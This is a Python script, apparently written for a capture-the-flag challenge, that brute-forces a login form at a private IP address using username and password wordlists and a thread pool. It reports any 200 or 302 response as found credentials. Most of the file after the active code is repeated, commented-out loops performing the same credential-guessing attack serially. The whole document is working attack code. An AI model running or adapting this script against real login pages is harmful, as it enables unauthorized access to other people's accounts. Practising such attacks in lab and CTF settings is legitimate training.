import requests
from concurrent.futures import ThreadPoolExecutor
import itertools
# Replace with your actual CTF challenge URL
url = "http://172.30.0.4/login"
MAX_THREADS = 15
username= set()
password= set()
success= False
def read_file(filepath):
    try:
        with open(filepath, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("file not found")
        return []

# Standard CTF credential lists (or use custom ones if provided)
username.update(read_file('wordlist/usernames/admin.txt'))
# username.update(read_file('wordlist/usernames/common.txt'))
# username.update(read_file('wordlist/usernames.txt'))
password.update(read_file('wordlist/passwords/common.txt'))
# password.update(read_file('wordlist/passwords/common_small.txt'))
usernameL= list(username)
passwordL= list(password)

print("passwords and usernames are loaded in a list")

def nput(combine):
    global success
    if success:
        print("success already found")
        return
    user, pwd = combine
    payload= {
        "username": user,
        "password": pwd
    }
    try:
        response = requests.post(url, data=payload, allow_redirects=False)
        if response.status_code in [200, 302] and response.status_code!= 401:
            success= True
            print(f"success!! {user}:{pwd}")
            print(f"status code: {response.status_code}")
            print("response content")
            print(response.text)
            return True
        else:
            print(f"[-] Tried {user}:{pwd} -> Got 401 Unauthorized (History Cleared)", end="\r")
    except requests.exceptions.RequestException:
        # Handle occasional network hiccups gracefully
        pass
    return False


print("[*] Starting multi-threaded attack...")
      
combinations= [(u, p) for u in usernameL for p in passwordL]
combinations_generator = itertools.product(usernameL, passwordL)

with ThreadPoolExecutor(MAX_THREADS) as exe:
    for results in exe.map(nput, combinations):
        if success:
            exe.shutdown(wait= False)
            print("success found!!")
            break

# max_workers=None, thread_name_prefix='', initializer=None, initargs=()
# for user in usernames:
#     for pwd in passwords:
#         payload = {
#             "username": user,
#             "password": pwd
#         }
        
#         # Using standalone requests.post() ensures that if the server 
#         # responds with a 'Set-Cookie: connect.sid', it is completely
#         # dropped and NOT sent in the next iteration of the loop.
#         response = requests.post(url, data=payload, allow_redirects=False)
        
#         if response.status_code != 401:
#             print(f"\n[+] SUCCESS! Found valid credentials -> {user}:{pwd}")
#             print(f"[+] Server responded with status code: {response.status_code}")
#             print("--- Response Content ---")
#             print(response.text) # Look for your flag here!
#             exit()
#         else:
#             print(f"[-] Tried {user}:{pwd} -> Got 401 Unauthorized (History Cleared)")

# for user in common:
#     for pwd in passwords:
#         payload = {
#             "username": user,
#             "password": pwd
#         }
        
#         # Using standalone requests.post() ensures that if the server 
#         # responds with a 'Set-Cookie: connect.sid', it is completely
#         # dropped and NOT sent in the next iteration of the loop.
#         response = requests.post(url, data=payload, allow_redirects=False)
        
#         if response.status_code != 401:
#             print(f"\n[+] SUCCESS! Found valid credentials -> {user}:{pwd}")
#             print(f"[+] Server responded with status code: {response.status_code}")
#             print("--- Response Content ---")
#             print(response.text) # Look for your flag here!
#             exit()
#         else:
#             print(f"[-] Tried {user}:{pwd} -> Got 401 Unauthorized (History Cleared)")

# for user in wordlist:
#     for pwd in passwords:
#         payload = {
#             "username": user,
#             "password": pwd
#         }
        
#         # Using standalone requests.post() ensures that if the server 
#         # responds with a 'Set-Cookie: connect.sid', it is completely
#         # dropped and NOT sent in the next iteration of the loop.
#         response = requests.post(url, data=payload, allow_redirects=False)
        
#         if response.status_code != 401:
#             print(f"\n[+] SUCCESS! Found valid credentials -> {user}:{pwd}")
#             print(f"[+] Server responded with status code: {response.status_code}")
#             print("--- Response Content ---")
#             print(response.text) # Look for your flag here!
#             exit()
#         else:
#             print(f"[-] Tried {user}:{pwd} -> Got 401 Unauthorized (History Cleared)")

# #doing pwd2 now

# for user in usernames:
#     for pwd in password2:
#         payload = {
#             "username": user,
#             "password": pwd
#         }
        
#         # Using standalone requests.post() ensures that if the server 
#         # responds with a 'Set-Cookie: connect.sid', it is completely
#         # dropped and NOT sent in the next iteration of the loop.
#         response = requests.post(url, data=payload, allow_redirects=False)
        
#         if response.status_code != 401:
#             print(f"\n[+] SUCCESS! Found valid credentials -> {user}:{pwd}")
#             print(f"[+] Server responded with status code: {response.status_code}")
#             print("--- Response Content ---")
#             print(response.text) # Look for your flag here!
#             exit()
#         else:
#             print(f"[-] Tried {user}:{pwd} -> Got 401 Unauthorized (History Cleared)")

# for user in common:
#     for pwd in password2:
#         payload = {
#             "username": user,
#             "password": pwd
#         }
        
#         # Using standalone requests.post() ensures that if the server 
#         # responds with a 'Set-Cookie: connect.sid', it is completely
#         # dropped and NOT sent in the next iteration of the loop.
#         response = requests.post(url, data=payload, allow_redirects=False)
        
#         if response.status_code != 401:
#             print(f"\n[+] SUCCESS! Found valid credentials -> {user}:{pwd}")
#             print(f"[+] Server responded with status code: {response.status_code}")
#             print("--- Response Content ---")
#             print(response.text) # Look for your flag here!
#             exit()
#         else:
#             print(f"[-] Tried {user}:{pwd} -> Got 401 Unauthorized (History Cleared)")

# for user in wordlist:
#     for pwd in password2:
#         payload = {
#             "username": user,
#             "password": pwd
#         }
        
#         # Using standalone requests.post() ensures that if the server 
#         # responds with a 'Set-Cookie: connect.sid', it is completely
#         # dropped and NOT sent in the next iteration of the loop.
#         response = requests.post(url, data=payload, allow_redirects=False)
        
#         if response.status_code != 401:
#             print(f"\n[+] SUCCESS! Found valid credentials -> {user}:{pwd}")
#             print(f"[+] Server responded with status code: {response.status_code}")
#             print("--- Response Content ---")
#             print(response.text) # Look for your flag here!
#             exit()
#         else:
#             print(f"[-] Tried {user}:{pwd} -> Got 401 Unauthorized (History Cleared)")